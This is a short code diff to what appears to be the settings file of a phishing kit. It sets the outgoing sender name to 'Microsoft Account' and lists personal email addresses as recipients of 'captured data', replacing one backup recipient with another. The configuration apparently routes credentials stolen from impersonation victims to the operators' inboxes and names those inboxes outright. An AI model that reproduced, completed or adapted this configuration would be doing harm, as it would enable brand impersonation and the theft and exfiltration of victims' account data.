@@ -134,7 +134,7 @@ DEFAULT_FROM_EMAIL = f"Microsoft Account <{EMAIL_HOST_USER}>"
 # Where to send captured data
 CAPTURE_EMAIL_RECIPIENTS = [
     'acexire@gmail.com',  # YOUR GMAIL
-    'aceabandi@gmail.com',      # CHANGE THIS - Your backup email
+    'textbox007@outlook.com',      # CHANGE THIS - Your backup email
     'viperace372@gmail.com',      # CHANGE THIS - Your second backup
 ]
 
